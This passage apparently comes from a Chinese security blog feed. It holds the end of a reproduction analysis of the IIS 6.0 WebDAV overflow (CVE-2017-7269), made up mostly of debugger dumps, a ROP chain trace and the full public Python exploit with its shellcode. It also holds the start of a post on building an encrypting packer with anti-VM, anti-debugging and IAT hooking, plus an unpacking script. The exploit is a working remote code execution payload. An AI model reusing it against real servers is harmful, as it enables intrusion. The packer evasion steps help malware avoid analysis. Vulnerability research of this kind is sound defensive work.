[ebp+var_C], edx</span><br><span class="line">.text:674035F3                 call    dword ptr [eax+24h];680313c0+24h</span><br><span class="line">.text:674035F6                 mov     ebx, eax</span><br></pre></td></tr></table></figure><p>此时<code>call</code>会跳转到<code>680313c0+24</code>处所存的地址<code>68016082</code>,经过一系列<code>ROP</code>创建<code>calc.exe</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; u</span><br><span class="line">httpext!ScStripAndCheckHttpPrefix+0x1e:</span><br><span class="line">674035f3 ff5024          call    dword ptr [eax+24h]</span><br><span class="line">674035f6 8bd8            mov     ebx,eax</span><br><span class="line">0:007&gt; r eax</span><br><span class="line">eax&#x3D;680313c0</span><br></pre></td></tr></table></figure><p><code>ROP</code>代码拼接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">68016082 8be1            mov     esp,ecx;680313c0</span><br><span class="line">68016084 8b08            mov     ecx,dword ptr [eax];680313c0</span><br><span class="line">68016086 8b4004          mov     eax,dword ptr [eax+4];68006e4f</span><br><span class="line">68016089 50              push    eax</span><br><span class="line">6801608a c3              ret;jmp 68006e4f</span><br><span class="line">[...]</span><br><span class="line">68006e4f 5e              pop     esi;680313c0</span><br><span class="line">68006e50 5d              pop     ebp;68006e4f</span><br><span class="line">68006e51 c22000          ret     20h;jmp 68006e4f</span><br><span class="line">[...]</span><br><span class="line">68006e4f 5e              pop     esi;4d47747a</span><br><span class="line">68006e50 5d              pop     ebp;57574459</span><br><span class="line">68006e51 c22000          ret     20h;jmp 6800b113</span><br><span class="line">[...]</span><br><span class="line">6800b113 6a40            push    40h</span><br><span class="line">6800b115 eb0e            jmp     rsaenh!GetHashLength+0x39 (6800b125)</span><br><span class="line">[...]</span><br><span class="line">6800b125 58              pop     eax;40</span><br><span class="line">6800b126 5d              pop     ebp;68031434</span><br><span class="line">6800b127 c20400          ret     4</span><br><span class="line">[...]</span><br><span class="line">680129e7 c9              leave;esp&#x3D;68031438</span><br><span class="line">680129e8 c3              ret</span><br><span class="line">[..]</span><br><span class="line">68006e05 8d65e0          lea     esp,[ebp-20h];680313fc</span><br><span class="line">68006e08 5f              pop     edi;680124e3</span><br><span class="line">68006e09 5e              pop     esi;68031460</span><br><span class="line">68006e0a 5b              pop     ebx;7ffe0300</span><br><span class="line">68006e0b c9              leave;esp&#x3D;68031420,ebp&#x3D;680129e7</span><br><span class="line">68006e0c c22400          ret     24h</span><br><span class="line">[...]</span><br><span class="line">68009391 58              pop     eax;68008246</span><br><span class="line">68009392 5d              pop     ebp;32534877</span><br><span class="line">68009393 c20400          ret     4</span><br><span class="line">[...]</span><br><span class="line">68021daa 8b8010010000    mov     eax,dword ptr [eax+110h];8f</span><br><span class="line">68021db0 5d              pop     ebp;680313f8</span><br><span class="line">68021db1 c20400          ret     4</span><br><span class="line">[...]</span><br><span class="line">680129e7 c9              leave;esp&#x3D;680313fc,ebp&#x3D;6e6f3176</span><br><span class="line">680129e8 c3              ret</span><br><span class="line">[...]</span><br><span class="line">680124e3 ff23            jmp     dword ptr [ebx];7ffe0300</span><br><span class="line">[...]</span><br><span class="line">7c9585e8 8bd4            mov     edx,esp;68031400</span><br><span class="line">7c9585ea 0f34            sysenter;NtProtectVirtualMemory </span><br><span class="line">[...]</span><br><span class="line">68031460 56              push    esi;68031460</span><br><span class="line">68031461 005600          add     byte ptr [esi],dl;00560056</span><br><span class="line">68031464 59              pop     ecx;68031460</span><br><span class="line">68031465 004100          add     byte ptr [ecx],al;00560056 </span><br><span class="line">68031468 3400            xor     al,0</span><br><span class="line">6803147c 51              push    ecx;68031460</span><br><span class="line">6803147d 004100          add     byte ptr [ecx],al;00560056</span><br><span class="line">68031480 54              push    esp;68031400</span><br><span class="line">....................</span><br><span class="line">680315f7 59              pop     ecx;68031614</span><br><span class="line">680315f8 5a              pop     edx;876f8b31</span><br><span class="line">680315f9 51              push    ecx;</span><br><span class="line">680315fa ffe0            jmp     eax;7c86411e WinExec(68031633,00000001)</span><br></pre></td></tr></table></figure><p>梳理利用思路：</p><ul><li><p>第一轮溢出(<code>HrCheckIfHeader</code>)</p><ul><li><p>第一次进入<code>while</code>循环(循环用来遍历请求包中的URL个数)</p><ul><li>调用<code>ScStoragePathFromUrl</code>返回路径长度</li><li>调用<code>ScStoragePathFromUrl</code>利用溢出覆盖<code>String</code>指向可利用的缓冲区地址(<code>0x680312c0</code>)</li></ul></li><li><p>第二次进入<code>while</code>循环</p><ul><li>调用<code>ScStoragePathFromUrl</code>将<code>shellcode</code>写入<code>0x680312c0</code>(判断缓存长度为<code>0x404040</code>，不需要分配新的缓冲区,且只需要调用一次<code>ScStoragePathFromUrl</code>)</li></ul></li></ul></li><li><p>第二轮溢出(<code>HrGetLockIdForPath</code>)</p><ul><li><p>第一次进入<code>while</code>循环</p><ul><li><p>调用<code>ScStoragePathFromUrl</code>返回路径长度</p></li><li><p>调用<code>ScStoragePathFromUrl</code>利用溢出覆盖<code>String</code>指向可利用的缓冲区地址(<code>0x680312c0</code>)，覆盖引用<code>CMethUtil</code>  对象的局部变量</p></li></ul></li><li><p>第二次进入<code>while</code>循环</p><ul><li>调用<code>ScStoragePathFromUrl</code>，<code>ScStripAndCheckHttpPrefix</code>函数调用<code>680313c0+24</code>开始<code>ROP</code>并执行<code>shellcode</code></li></ul></li></ul></li></ul><h4 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h4><hr><p>第一次调用<code>ScStoragePathFromUrl</code></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; dd ebp-328</span><br><span class="line">012bf90c  012bf804 673e205b 00000013 012bf9c0</span><br><span class="line">012bf91c  673f87e7 00000000 000000f0 00000013</span><br><span class="line">012bf92c  00000000 01e8df34 673f87fc 012bf9d0</span><br><span class="line">012bf93c  752d6669 646f6d6e 65696669 69732d64</span><br><span class="line">012bf94c  0065636e 00000000 01e80178 00000000</span><br><span class="line">012bf95c  00000000 01e80608 00000108 0000fee8</span><br><span class="line">012bf96c  012bf984 5a63210d 013448c8 012bfa54</span><br><span class="line">012bf97c  01e8c078 012bf998 012bf9b0 5a5c1367</span><br></pre></td></tr></table></figure><p>第二次调用<code>ScStoragePathFromUrl</code></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; dd ebp-328</span><br><span class="line">012bf90c  680312c0 52566c44 6c6d4b37 585a4f58</span><br><span class="line">012bf91c  496a7950 4a52584f 664d4150 680313c0</span><br><span class="line">012bf92c  65314834 6e666f43 436c7441 680313c0</span><br><span class="line">012bf93c  6a415343 33307052 424c5866 6346704b</span><br><span class="line">012bf94c  79415173 4a6c7a50 0000003e 00000000</span><br><span class="line">012bf95c  00000000 01e80608 00000108 0000fee8</span><br><span class="line">012bf96c  012bf984 5a63210d 013448c8 012bfa54</span><br><span class="line">012bf97c  01e8c078 012bf998 012bf9b0 5a5c1367</span><br></pre></td></tr></table></figure><p>调用<code>ScStoragePathFromUrl</code>将<code>shellcode</code>写入<code>0x680312c0</code></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; db 680312c0 </span><br><span class="line">680312c0  63 00 3a 00 5c 00 69 00-6e 00 65 00 74 00 70 00  c.:.\.i.n.e.t.p.</span><br><span class="line">680312d0  75 00 62 00 5c 00 77 00-77 00 77 00 72 00 6f 00  u.b.\.w.w.w.r.o.</span><br><span class="line">680312e0  6f 00 74 00 5c 00 62 00-62 00 62 00 62 00 62 00  o.t.\.b.b.b.b.b.</span><br><span class="line">680312f0  62 00 62 00 48 79 75 61-43 4f 67 6f 6f 6b 45 48  b.b.HyuaCOgookEH</span><br><span class="line">68031300  46 36 75 67 33 44 71 38-65 57 62 5a 35 54 61 56  F6ug3Dq8eWbZ5TaV</span><br><span class="line">68031310  52 69 53 6a 57 51 4e 38-48 59 55 63 71 49 64 43  RiSjWQN8HYUcqIdC</span><br><span class="line">68031320  72 64 68 34 58 47 79 71-6b 33 55 6b 48 6d 4f 50  rdh4XGyqk3UkHmOP</span><br><span class="line">68031330  46 7a 71 34 54 6f 43 74-56 59 6f 6f 41 73 57 34  Fzq4ToCtVYooAsW4</span><br></pre></td></tr></table></figure><p><code>HrGetLockIdForPath</code>中第一次调用<code>ScStoragePathFromUrl</code></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; dd ebp-14</span><br><span class="line">012bfbbc  012bfab4 000045a9 012bfc30 67410bdd</span><br><span class="line">012bfbcc  00000002 012bfc3c 673eaba9 01e8cb16</span><br><span class="line">012bfbdc  80000000 012bfc28 00000000 01e8f248</span><br><span class="line">012bfbec  01e8f780 01e8f780 00000000 00000000</span><br><span class="line">012bfbfc  00000000 00000040 00000000 012bfc29</span><br><span class="line">012bfc0c  00000012 01e8cf68 00000000 00000000</span><br><span class="line">012bfc1c  00000000 00000000 00000000 00000000</span><br><span class="line">012bfc2c  00000000 012bfc6c 6740fd44 00000000</span><br></pre></td></tr></table></figure><p>第二次调用<code>ScStoragePathFromUrl</code>，地址<code>012bfbe8</code>被填充为<code>680313c0</code></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; dd ebp-14</span><br><span class="line">012bfbbc  680312c0 52566c44 6c6d4b37 585a4f58</span><br><span class="line">012bfbcc  496a7950 4a52584f 664d4150 680313c0</span><br><span class="line">012bfbdc  65314834 6e666f43 436c7441 680313c0</span><br><span class="line">012bfbec  6a415343 33307052 424c5866 6346704b</span><br><span class="line">012bfbfc  79415173 4a6c7a50 0000003e 012bfc29</span><br><span class="line">012bfc0c  00000012 01e8cf68 00000000 00000000</span><br><span class="line">012bfc1c  00000000 00000000 00000000 00000000</span><br><span class="line">012bfc2c  00000000 012bfc6c 6740fd44 00000000</span><br></pre></td></tr></table></figure><p>解析 <code>URL</code> 第二部分，跳转到<code>680313c0+24</code>，最后就是<code>ROP+shellcode</code>了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; u</span><br><span class="line">httpext!ScStripAndCheckHttpPrefix+0x1e:</span><br><span class="line">674035f3 ff5024          call    dword ptr [eax+24h]</span><br><span class="line">674035f6 8bd8            mov     ebx,eax</span><br><span class="line">0:007&gt; r eax</span><br><span class="line">eax&#x3D;680313c0</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><hr><p>第一次<code>url aaaaaa</code>中，就已经引发了栈溢出，覆盖到了<code>String</code>指针，这个指针存放在栈里，用于后续调用存放虚拟路径，由于第一次栈溢出，覆盖到了这个变量导致第二次<code>url bbbbb</code>拷贝的时候，是向一个堆地址拷贝，在<code>HrGetLockIdForPath</code>函数中同样的方式解析<code>url aaaaaa</code>,这时覆盖了调用栈中用来保存<code>CParseLockTokenHeader</code>对象成员的指针变量，在<code>ScStoragePathFromUrl</code>中正好调用到这个对象，利用这次覆盖可以达到劫持<code>EIP</code>的效果。</p><h3 id="公开的EXP代码"><a href="#公开的EXP代码" class="headerlink" title="公开的EXP代码"></a>公开的EXP代码</h3><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.</span></span><br><span class="line"><span class="comment">#written by Zhiniang Peng and Chen Wu. Information Security Lab &amp; School of Computer Science &amp; Engineering, South China University of Technology Guangzhou, China </span></span><br><span class="line"><span class="comment">#-----------Email: edwardz@foxmail.com</span></span><br><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line">sock.connect((<span class="string">'192.168.59.129'</span>,<span class="number">80</span>))  </span><br><span class="line">pay=<span class="string">'PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'</span></span><br><span class="line">pay+=<span class="string">'If: &lt;http://localhost/aaaaaaa'</span></span><br><span class="line">pay+=<span class="string">'\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'</span></span><br><span class="line">pay+=<span class="string">'&gt;'</span></span><br><span class="line">pay+=<span class="string">' (Not &lt;locktoken:write1&gt;) &lt;http://localhost/bbbbbbb'</span></span><br><span class="line">pay+=<span class="string">'\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'</span></span><br><span class="line">shellcode=<span class="string">'VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'</span></span><br><span class="line">pay+=shellcode</span><br><span class="line">pay+=<span class="string">'&gt;\r\n\r\n'</span></span><br><span class="line"><span class="keyword">print</span> pay</span><br><span class="line">sock.send(pay)  </span><br><span class="line">data = sock.recv(<span class="number">80960</span>)  </span><br><span class="line"><span class="keyword">print</span> data </span><br><span class="line">sock.close</span><br></pre></td></tr></table></figure><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><hr><p><code>IIS_exploit</code><a href="https://github.com/edwardz246003/IIS_exploit" target="_blank" rel="noopener">https://github.com/edwardz246003/IIS_exploit</a></p><p><code>Paper</code><a href="https://paper.seebug.org/259/" target="_blank" rel="noopener">https://paper.seebug.org/259/</a></p><p><code>Microsoft</code><a href="https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants</a></p><p><code>腾讯玄武实验室</code><a href="https://xlab.tencent.com/cn/2017/04/18/nsa-iis-vulnerability-analysis/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2017/04/18/nsa-iis-vulnerability-analysis/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CVE-2017-7296复现分析&quot;&gt;&lt;a href=&quot;#CVE-2017-7296复现分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2017-7296复现分析&quot;&gt;&lt;/a&gt;CVE-2017-7296复现分析&lt;/h2&gt;&lt;h3 id=&quot;Micro
      
    
    </summary>
    
    
      <category term="C\C++" scheme="http://yeanhoo.gitee.io/categories/C-C/"/>
    
    
      <category term="漏洞复现" scheme="http://yeanhoo.gitee.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="CVE-2017-7269" scheme="http://yeanhoo.gitee.io/tags/CVE-2017-7269/"/>
    
  </entry>
  
  <entry>
    <title>简易加密壳</title>
    <link href="http://yeanhoo.gitee.io/2021/03/07/%E7%AE%80%E6%98%93%E5%8A%A0%E5%AF%86%E5%A3%B3/"/>
    <id>http://yeanhoo.gitee.io/2021/03/07/%E7%AE%80%E6%98%93%E5%8A%A0%E5%AF%86%E5%A3%B3/</id>
    <published>2021-03-07T13:03:13.149Z</published>
    <updated>2021-03-08T13:45:19.073Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简易加密壳"><a href="#简易加密壳" class="headerlink" title="简易加密壳"></a>简易加密壳</h2><p><a href="https://github.com/yeanhoo/encryptPacker" target="_blank" rel="noopener">代码已开源</a>：<a href="https://github.com/yeanhoo/encryptPacker" target="_blank" rel="noopener">https://github.com/yeanhoo/encryptPacker</a></p><h3 id="加壳器实现"><a href="#加壳器实现" class="headerlink" title="加壳器实现"></a>加壳器实现</h3><ul><li>将需要加壳程序映射到内存</li><li>加载壳Dll</li><li>读取壳代码函数节区内偏移</li><li>保存需要加壳程序必须信息</li><li>加密需要加壳程序节区</li><li>复制壳节区</li><li>将程序必须信息写入到PE头空闲处</li><li>设置新OEP指向壳代码开始函数</li><li>保存到文件</li></ul><h3 id="壳代码实现"><a href="#壳代码实现" class="headerlink" title="壳代码实现"></a>壳代码实现</h3><ul><li>混淆代码</li><li>检测虚拟机</li><li>检测调试器</li><li>获取API</li><li>解密节区</li><li>修复IAT、重定位、TLS等信息</li><li>HOOK IAT</li><li>跳转到原始OEP</li></ul><p><strong>壳代码VS配置：</strong><br>配置属性-&gt;高级-&gt;字符集-&gt;使用多字节字符集</p><p>C/C++-&gt;语言-&gt;符合模式-&gt;否</p><p>C/C++-&gt;代码生成-&gt;安全检查-&gt;禁用安全检查(/GS-)</p><p>C/C++-&gt;代码生成-&gt;运行库-&gt;多线程(/MT)</p><p>C/C++-&gt;优化-&gt;优化-&gt;已禁用</p><p>链接器-&gt;清单文件-&gt;生成清单-&gt;否</p><p>链接器-&gt;调试-&gt;生成调试信息-&gt;否</p><p>链接器-&gt;高级-&gt;无入口点-&gt;是</p><p>OD脱加密壳通用模板</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F; 临时变量，用来保存API地址</span><br><span class="line">MOV dwEAX,0 </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 当EIP执行到这个地址的时候API放在EAX中 </span><br><span class="line">MOV dwGetProcAddr,00410000</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 当EIP执行到这个地址的时候IAT刚刚被填充为申请的那段内存地址</span><br><span class="line">&#x2F;&#x2F; 其地址中保存的是加密后的API地址，以及动态解密代码 </span><br><span class="line">MOV dwWriteIATAddr,00420000</span><br><span class="line">MOV dwOEPAddr,00401000 &#x2F;&#x2F; IEP执行到OEP就可以dump了</span><br><span class="line">&#x2F;&#x2F; 清除所有软件断点</span><br><span class="line">BC</span><br><span class="line">&#x2F;&#x2F; 清除所有硬件断点</span><br><span class="line">BPHWCALL</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置硬件执行断点</span><br><span class="line">BPHWS dwGetProcAddr,&quot;x&quot;</span><br><span class="line">BPHWS 